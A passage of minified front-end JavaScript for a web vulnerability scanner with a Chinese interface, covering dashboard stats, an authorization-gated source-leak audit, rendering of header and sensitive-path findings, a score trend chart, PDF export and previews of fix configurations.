t.credits=="number"?t.credits:null;i.textContent=s===null?"--":String(s)}).catch(function(){i.textContent="--"})}}function Yr(){let e=document.getElementById("dashboard-overview");if(!ve()){e&&(e.style.display="none");return}e&&(e.style.display="grid"),Kr(),dn(),ue("/api/dashboard").then(function(i){return i.json()}).then(function(i){let t=document.getElementById("home-stat-scan-count"),s=document.getElementById("home-stat-high-risk"),r=document.getElementById("home-stat-fixed-count"),o=document.getElementById("home-stat-score");t&&(t.textContent=i.total_scans||0),s&&(s.textContent=i.high_risk_count||0),r&&(r.textContent=i.fixed_count||0),o&&i.recent_scans&&i.recent_scans.length>0?o.textContent=i.recent_scans[0].score||"-":o&&(o.textContent="-")}).catch(function(){}),pn(),loadTrendChart(30)}let ei=!1,Ut=null;function cn(){let e=document.getElementById("audit-url");if(e&&e.value)return e.value.trim();if(de&&de.url)return String(de.url).trim();let i=document.getElementById("scan-url");return i&&i.value?i.value.trim():""}function Qr(){let e=document.getElementById("audit-url");if(!e)return;let i=cn();if(!i){M("当前没有可用的网址，请先在扫描页输入网址","warn");return}e.value=i,M("已填入当前网址","success")}function Pi(e,i){let t=E(e.name||e.title||"审计项 "+(i+1)),s=String(e.severity||"info").toLowerCase(),r=E(e.summary||e.description||""),o=s==="critical"||s==="high"?"#c75450":s==="medium"?"#f0a732":"#73c990",a=s==="critical"?"严重":s==="high"?"高危":s==="medium"?"中危":s==="low"?"低危":"信息",n=e.confidence||"low",c="";return e.evidence&&typeof e.evidence=="object"?c=ri(e.evidence):e.evidence_text?c='<div style="margin-top:10px;font-size:12px;color:var(--text-secondary)">'+E(e.evidence_text)+"</div>":e.evidence_html&&(c='<div style="margin-top:10px">'+e.evidence_html+"</div>"),'<div style="padding:14px 16px;border:1px solid var(--border);border-radius:2px;background:var(--bg);margin-bottom:10px"><div style="display:flex;justify-content:space-between;gap:12px;align-items:flex-start;margin-bottom:8px"><div style="font-weight:700;color:var(--text)">'+t+'</div><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:'+o+"20;color:"+o+';font-size:12px;font-weight:700">'+a+'</span><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px;font-weight:700">置信度 '+n+"</span></div>"+(r?'<div style="font-size:13px;line-height:1.7;color:var(--text-secondary)">'+r+"</div>":"")+c+"</div>"}async function es(){if(ei)return;let e=document.getElementById("audit-url"),i=document.getElementById("audit-status"),t=document.getElementById("audit-result"),s=document.getElementById("audit-run-btn"),r=document.getElementById("audit-auth-check"),o=cn();if(!o){M("请输入要审计的网址","warn"),e&&e.focus();return}if(r&&!r.checked){M("请先确认已获得授权","warn");return}ei=!0,s&&(s.disabled=!0,s.textContent="审计中..."),i&&(i.textContent="正在审计 "+o+"，请稍候..."),t&&(t.innerHTML='<div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">正在分析源码泄露、敏感文件与上线前基础风险...</div>');try{let a=await rr({url:o,depth:"standard",authorized:!0}),n=Array.isArray(a.findings)?a.findings:[],c=Hr(n),p=Nr(c),v=c.filter(function(x){return x.confidence!=="low"}),d=c.filter(function(x){return x.confidence==="low"}),f=n.length,h=typeof a.score=="number"?a.score:a.score||"-",m=a.risk_level||a.risk||"未知",g=v.length>0?"发现 "+v.length+" 个较可信源码/上线相关问题":c.length>0?"发现少量可疑项，建议复核":"未发现明显源码泄露迹象",y=v.slice(0,5).map(Pi).join(""),b=Oi().map(function(x){return'<span style="display:inline-block;margin:0 8px 8px 0;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px">'+E(x)+"</span>"}).join(""),k=c.length===0?'<div style="padding:14px 16px;border:1px solid rgba(115,201,144,0.25);border-radius:2px;background:rgba(115,201,144,0.08);color:var(--text-secondary);line-height:1.7">当前扫描没有发现明显的源码泄露或上线前暴露项。建议在修复后再复测一次，并继续关注强登录态、重定向和 WAF 干扰场景。</div>':"";Ut={url:o,time:new Date().toISOString(),risk:m,score:h,total:f,headline:g,findings:c,trustedFindings:v,reviewFindings:d,rawFindings:n,coverage:[...Oi()]},t&&(t.innerHTML='<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:14px"><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">审计目标</div><div style="margin-top:6px;font-weight:700;word-break:break-all">'+E(o)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">风险等级</div><div style="margin-top:6px;font-weight:700">'+E(m)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">安全评分</div><div style="margin-top:6px;font-weight:700">'+E(String(h))+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">问题总数</div><div style="margin-top:6px;font-weight:700">'+f+'</div></div></div><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px"><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">高置信度</div><div style="margin-top:4px;font-weight:700">'+p.high+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">中置信度</div><div style="margin-top:4px;font-weight:700">'+p.medium+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">低置信度</div><div style="margin-top:4px;font-weight:700">'+p.low+'</div></div></div><div style="margin-bottom:14px"><div style="font-size:15px;font-weight:700;margin-bottom:8px">审计结论</div><div style="line-height:1.8;color:var(--text-secondary)">'+g+'</div></div><div style="margin-bottom:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">覆盖范围</div>'+b+"</div>"+k+(y?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">可信命中项</div>'+y+"</div>":"")+(d.length?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">需复核项</div>'+d.slice(0,3).map(Pi).join("")+"</div>":"")),i&&(i.textContent=v.length>0?"审计完成，已发现可信项。":c.length>0?"审计完成，发现少量可疑项，建议复核。":"审计完成，未发现明显源码泄露迹象。"),M("审计完成","success")}catch(a){let n=mt(a);Ut=null,i&&(i.textContent="审计失败："+n),t&&(t.innerHTML='<div style="padding:14px 16px;border:1px solid rgba(199,84,80,0.25);border-radius:2px;background:rgba(199,84,80,0.08);color:var(--text-secondary)">'+E(n)+"</div>"),M("审计失败："+n,"error")}finally{ei=!1,s&&(s.disabled=!(r&&r.checked),s.textContent="开始审计")}}function ts(){if(!Ut){M("请先完成一次审计","warn");return}let e=Ut,i=document.querySelector('#page-audit .card button[onclick="downloadAuditReport()"]');i&&(i.disabled=!0,i.textContent="导出中..."),ue("/api/report/audit",{method:"POST",body:JSON.stringify({url:e.url,time:e.time,risk:e.risk,risk_level:e.risk,score:e.score,total:e.total,headline:e.headline,findings:e.findings||[],summary:{critical:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="critical"}).length,high:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="high"}).length,medium:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="medium"}).length,low:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="low"}).length,info:(e.findings||[]).filter(function(t){return!String(t.severity||"").toLowerCase()||String(t.severity||"").toLowerCase()==="info"}).length,total:e.total||(e.findings||[]).length},coverage:e.coverage||[],confidence_counts:e.confidenceCounts||{high:0,medium:0,low:0}})}).then(function(t){return t.ok?t.blob().then(function(s){let r=URL.createObjectURL(s),o=document.createElement("a");o.href=r,o.download="vuln-sentinel-audit-report.pdf",document.body.appendChild(o),o.click(),document.body.removeChild(o),URL.revokeObjectURL(r),M("审计 PDF 已下载")}):t.text().then(function(s){throw new Error(s||"HTTP "+t.status)})}).catch(function(t){M("导出失败："+mt(t),"error")}).finally(function(){i&&(i.disabled=!1,i.textContent="导出审计报告")})}function pn(){let e=document.getElementById("trend-panel");!ve()||!e||(e.style.display="block",ue("/api/trend?limit=30").then(function(i){return i.json()}).then(function(i){let t=i.summary||{},s=i.series||{},r=i.urls||[],o=document.getElementById("trend-summary");if(o){let c=[];t.total_scans>0&&(c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 '+t.avg_score+" 分</span>"),t.improved?c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>'):t.total_scans>1&&c.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>')),o.innerHTML=c.join("")}let a=document.getElementById("trend-empty"),n=document.getElementById("trend-canvas");if(t.total_scans===0){a&&(a.style.display="flex"),n&&(n.style.display="none");return}a&&(a.style.display="none"),n&&(n.style.display="block"),un(s,r)}).catch(function(){}))}function un(e,i){let t=document.getElementById("trend-canvas");if(!t)return;let s=t.getContext("2d"),r=window.devicePixelRatio||1,o=t.parentElement.getBoundingClientRect();t.width=o.width*r,t.height=o.height*r,s.scale(r,r);let a=o.width,n=o.height,c=["#4b6eaf","#73c990","#f0a732","#c75450","#c75450","#4b6eaf","#4b6eaf"],p=[],v=[];for(let z=0;z<i.length;z++){let R=i[z],O=e[R]||[];if(O.length===0)continue;let j=O.map(function(P){return P.score});v=v.concat(j),p.push({url:R,points:O,color:c[z%c.length]})}if(p.length===0||v.length===0)return;let d={top:20,right:20,bottom:30,left:45},f=a-d.left-d.right,h=n-d.top-d.bottom,m=Math.max(Math.min.apply(null,v)-5,0),g=Math.min(Math.max.apply(null,v)+5,100),y=g-m||1;s.clearRect(0,0,a,n),s.strokeStyle="rgba(255,255,255,0.06)",s.lineWidth=1;let b=5;for(let z=0;z<=b;z++){let R=d.top+z/b*h;s.beginPath(),s.moveTo(d.left,R),s.lineTo(a-d.right,R),s.stroke();let O=Math.round(g-z/b*y);s.fillStyle="rgba(255,255,255,0.4)",s.font="10px sans-serif",s.textAlign="right",s.fillText(O,d.left-8,R+3)}let k=d.top+(g-90)/y*h,x=d.top+(g-70)/y*h;s.fillStyle="rgba(115,201,144,0.05)",s.fillRect(d.left,k,f,d.top-k+h),s.fillStyle="rgba(240,167,50,0.05)",s.fillRect(d.left,x,f,k-x);for(let z=0;z<p.length;z++){let R=p[z],O=R.points,j=O.length;if(j<1)continue;let P=[];for(let N=0;N<j;N++)P.push(d.left+(j>1?N/(j-1)*f:f/2));s.beginPath();for(let N=0;N<j;N++){let Y=P[N],S=d.top+(g-O[N].score)/y*h;N===0?s.moveTo(Y,S):s.lineTo(Y,S)}s.lineTo(P[j-1],d.top+h),s.lineTo(P[0],d.top+h),s.closePath(),s.fillStyle=R.color+"15",s.fill(),s.beginPath(),s.strokeStyle=R.color,s.lineWidth=2.5,s.lineJoin="round",s.lineCap="round";for(let N=0;N<j;N++){let Y=P[N],S=d.top+(g-O[N].score)/y*h;N===0?s.moveTo(Y,S):s.lineTo(Y,S)}s.stroke();for(let N=0;N<j;N++){let Y=P[N],S=d.top+(g-O[N].score)/y*h;s.beginPath(),s.arc(Y,S,4,0,Math.PI*2),s.fillStyle=R.color,s.fill(),s.beginPath(),s.arc(Y,S,2,0,Math.PI*2),s.fillStyle="#fff",s.fill()}if(j>0){let N=P[j-1],Y=d.top+(g-O[j-1].score)/y*h;s.beginPath(),s.arc(N,Y,6,0,Math.PI*2),s.fillStyle=R.color+"40",s.fill(),s.beginPath(),s.arc(N,Y,3.5,0,Math.PI*2),s.fillStyle=R.color,s.fill()}}let I=document.getElementById("trend-legend");if(I){let z="";for(let R=0;R<p.length;R++){let O=et(p[R].url);z+='<div style="display:flex;align-items:center;gap:5px;font-size:12px">',z+='<div style="width:10px;height:3px;border-radius:2px;background:'+p[R].color+'"></div>',z+='<span style="color:var(--text-secondary)">'+E(O)+"</span>",z+="</div>"}I.innerHTML=z}}async function is(){let e=document.getElementById("public-report-host"),i=document.getElementById("public-report-refresh"),t=e&&e.value||"https://example.com";i&&(i.disabled=!0,i.textContent="扫描中…");let s=document.getElementById("public-report-content");s&&(s.innerHTML='<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>');try{let r=await ue("/api/public-演示-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t})}),o=await r.json();r.ok&&o.success?(window._lastScanId=o.scan_id||o.scanId||null,window._lastScanResult=o,ns(o)):s&&(s.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+E(mt(De(o)))+"</div>")}catch(r){s&&(s.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+E(mt(r))+"</div>")}finally{i&&(i.disabled=!1,i.textContent="重新扫描")}}function ns(e){let i=document.getElementById("public-report-content");if(!i)return;let t=e.score||0,s=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",r="#3c3f41",o=e.findings||[],a=e.summary||{high:0,medium:0,low:0},n=[];a.high&&n.push(a.high+" 高风险"),a.medium&&n.push(a.medium+" 中风险"),a.low&&n.push(a.low+" 低风险");let c=e.waf||[],p=c.length?c.map(function(y){return y.name}).join("、"):"未检测到 WAF",v=e.raw_headers||{},d=Object.keys(v),f=[];["strict-transport-security","content-security-policy","x-frame-options","x-content-type-options"].forEach(function(y){d.some(function(b){return b.toLowerCase()===y})||f.push(y)});let h=e.sensitive_paths||[],m="";h.length>0?m=h.slice(0,5).map(function(y){let b=y.exposed?"暴露":"安全";return'<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/'+y.path+"</code><span>"+b+"</span></div>"}).join(""):m='<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 '+(e.sensitive_checked||0)+" 个常见敏感路径，未发现暴露</div>";let g="";if(g+='<div style="background:'+r+";border:1px solid #555555;border-left:3px solid "+s+';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">',g+='<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>',e.note&&(g+='<div style="font-size:12px;color:#f0a732;margin-top:2px">'+E(e.note)+"</div>"),g+='<div style="font-size:14px;font-weight:600;margin-top:2px">'+e.final_url+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: '+(e.is_https?"是":"否")+" · WAF: "+p+' · 风险等级: <strong style="color:'+s+'">'+(e.risk_level||"未知")+"</strong></div></div>",g+='<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:'+s+'">'+t+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>',g+="</div>",e.is_cached&&(g+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">'+E(e.note||"当前展示缓存扫描数据")+"</div>"),g+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">'+a.high+'</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">'+a.medium+'</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">'+a.low+'</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>',g+="</div>",g+='<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>',g+='<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">',d.slice(0,15).forEach(function(y){let b=String(v[y]);g+='<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">'+y+'</span>: <span class="response-header-value">'+E(b)+"</span></div>"}),d.length>15&&(g+='<div style="color:#64748b;margin-top:4px">... 还有 '+(d.length-15)+" 个</div>"),g+="</div></details>",g+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（'+f.length+" 个）</summary>",f.length===0?g+='<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>':(g+='<div style="margin-top:6px;padding:8px;font-size:12px">',f.forEach(function(y){g+="缺失: "+y+"<br>"}),g+="</div>"),g+="</details>",g+='<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>',g+='<div style="margin-top:6px">'+m+"</div></details>",o.length>0&&(g+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（'+o.length+" 项）</summary>",g+='<div style="margin-top:6px;max-height:280px;overflow-y:auto">',o.forEach(function(y){let b=y.severity==="high"?"#c75450":y.severity==="medium"?"#f0a732":"#4b6eaf",k=y.severity==="high"?"高":y.severity==="medium"?"中":"低",x=y.fix||y.recommendation||"";g+='<div data-finding-name="'+E(y.name||"")+'" data-severity="'+(y.severity||"low")+'" data-owasp="'+E(y.owasp||"")+'" data-detail="'+E(y.detail||"")+'" data-fix="'+E(x)+'" style="padding:8px;margin-bottom:6px;border-left:3px solid '+b+';background:var(--bg);border-radius:2px">',g+='<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">'+E(y.name||"")+"</div>",g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:'+b+';color:#fff">'+k+"</span>";let z={critical:"P0",high:"P1",medium:"P2",low:"P3"}[y.severity]||"P3",R={P0:"#c75450",P1:"#f0a732",P2:"#f0a732",P3:"#73c990"};g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:'+R[z]+";font-weight:600;margin-left:6px;border:1px solid "+R[z]+'">'+z+"</span></div>";let O=["sqli","xss","csrf","ssti","open_redirect","cmdi","traversal","deserialization","ssrf","xxe","idor","info_leak","auth_weakness","bruteforce_protection","unauthorized_access","api_auth_missing","sensitive_config_exposure"],j=String(y.type||"").toLowerCase();O.indexOf(j)>=0&&(g+='<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>'),y.owasp&&(g+='<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: '+y.owasp+"</div>"),y.detail&&(g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+E(y.detail)+"</div>"),y.recommendation&&(g+='<div style="font-size:12px;color:#73c990;margin-top:4px">建议：'+E(y.recommendation)+"</div>"),x&&(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">建议</summary>',g+='<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+E(x)+"</pre>",g+="</details>"),x&&(y&&y.verify_steps&&y.verify_steps.length>0?(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>',g+='<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">',y.verify_steps.forEach(function(P,N){g+='<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">',g+='<div style="font-weight:600;color:var(--text-primary)">第'+(N+1)+"步："+E(P.method||"")+"</div>",P.expect&&(g+='<div style="color:var(--text-secondary);margin-top:2px">预期：'+E(P.expect)+"</div>"),g+="</div>"}),g+="</div></details>"):g+='<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：复测后重新扫描该网站，查看此项是否消失或评分是否提升。</div>'),g+='<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项需要复测，可结合建议、响应证据和二次扫描结果综合判断。</div>',g+="</div>"}),g+="</div></details>"),e&&e.fixes&&Object.keys(e.fixes).length>0){let y=e.fixes,b={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask",spring_boot:"Spring Boot",cloudflare:"Cloudflare",python:"Python",nodejs:"Node.js"},x=["nginx","apache","express","flask","spring_boot","cloudflare","nodejs","python"].filter(function(I){return y[I]&&y[I].length>0});x.length>0&&(g+='<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">',g+='<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整建议（'+x.length+" 种平台）</div>",g+='<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">',x.forEach(function(I,z){let R=z===0;g+=`<button onclick="switchPublicFixTab('`+I+`')" id="pub-fix-tab-`+I+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(R?"var(--success)":"var(--border)")+";background:"+(R?"var(--success)":"transparent")+";color:"+(R?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+b[I]+"</button>"}),g+="</div>",x.forEach(function(I,z){let R=z===0?"block":"none",O=y[I];g+='<div id="pub-fix-pane-'+I+'" style="display:'+R+';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">',O.forEach(function(j,P){let N=typeof j=="string"?j:j&&j.code?j.code:String(j);g+='<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">',g+='<div style="color:#808080;font-size:11px;margin-bottom:2px"># '+(P+1)+"</div>",g+='<pre style="margin:0;white-space:pre-wrap;word-break:break-all">'+E(N)+"</pre>",g+="</div>"}),g+="</div>"}),g+="</div>")}g+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',g+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用修复器生成补丁</button>`,ve()?g+='<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>':g+=`<button onclick="navigateTo('profile')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>`,g+="</div>",i.innerHTML=g}function rs(e){document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(s){s.style.display="none"});let i=document.getElementById("pub-fix-pane-"+e);i&&(i.style.display="block"),document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(s){s.style.background="transparent",s.style.color="var(--text-secondary)",s.style.border="1px solid var(--border)"});let t=document.getElementById("pub-fix-tab-"+e);t&&(t.style.background="var(--success)",t.style.color="#fff",t.style.border="1px solid var(--success)")}async function ss(){let e=document.getElementById("public-report-content");if(!e)return;let i=[];if(e.querySelectorAll("[data-finding-name]").forEach(function(t){i.push({name:t.getAttribute("data-finding-name"),severity:t.getAttribute("data-severity")||"low",owasp:t.getAttribute("data-owasp")||"",detail:t.getAttribute("data-detail")||"",fix:t.getAttribute("data-fix")||""})}),i.length===0){M("没有发现需要修复的问题");return}try{if(!(ve()&&window._lastScanId)){if(ve()){let t=document.getElementById("public-report-host")?document.getElementById("public-report-host").value:"https://example.com",s=await ue("/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t,depth:"standard",authorized:!!(document.getElementById("auth-check-step1")&&document.getElementById("auth-check-step1").checked||document.getElementById("auth-check")&&document.getElementById("auth-check").checked)})});if(s.ok){let r=await s.json();window._lastScanId=r.scan_id}}}}catch{}try{let t={findings:i};window._lastScanId&&(t.scan_id=window._lastScanId);let s=await ue("/api/simulate-fix",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}),r=await s.json();if(!s.ok){M("生成修复配置失败");return}fn(r)}catch(t){M("网络错误："+(t.message||t))}}function fn(e){try{let i=document.getElementById("public-report-content");if(!i)return;if(!e||typeof e!="object"){i.innerHTML='<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';return}let t="";t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">',t+='<h3 style="margin:0;font-size:16px">修复效果预览</h3>',t+='<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>',t+="</div>",t+='<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">',t+='<div style="font-size:14px;font-weight:600;color:#73c990">'+e.summary+"</div>",t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">',t+='<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:var(--text-secondary)">复测前</div>',t+='<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">'+e.before_score+"</div>",t+="</div>",t+='<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>',t+='<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:#73c990">复测后</div>',t+='<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">'+e.after_score+"</div>",t+='<div style="font-size:12px;color:#73c990;margin-top:2px">+ '+e.delta+" 分</div>",t+="</div>",t+="</div>",t+='<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（'+e.fixed_count+" 项）</h4>",t+='<div style="max-height:300px;overflow-y:auto">',e.fixed_items.forEach(function(s,r){let o=s.severity==="high"?"#c75450":s.severity==="medium"?"#f0a732":"#4b6eaf",a=s.severity==="high"?"高":s.severity==="medium"?"中":"低";t+='<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid '+o+'">',t+='<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">'+(r+1)+".</div>",t+='<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">'+E(s.name||"")+"</span>",t+='<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:'+o+';color:#fff">'+a+"</span>",s.owasp&&(t+='<span style="font-size:11px;color:#a5b4fc">'+E(s.owasp)+"</span>"),t+="</div>",s.fix&&(t+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">'+E(s.fix).substring(0,200)+"</div>"),t+="</div></div>"}),t+="</div>",t+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',ve()?(t+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>`,t+=`<button onclick="showAutoFixDialog('`+(window._lastScanId||"")+"', "+(e.fixed_count||0)+')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>'):t+=`<button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>`,t+="</div>",i.innerHTML=t}catch(i){console.error("renderFixComparison error:",i);let t=document.getElementById("public-report-content");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复对比失败: '+E(i.message||String(i))+"</p></div>")}}function os(e,i){try{if(document.getElementById("auto-fix-dialog"))return;if(!e){M("请先完成一次扫描");return}let t="";t+='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">',t+='<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">',t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',t+='<h3 style="margin:0;font-size:18px">生成修复配置 '+i+" 项问题</h3>",t+='<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>',t+="</div>",t+='<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">',t+="<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>",t+="<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 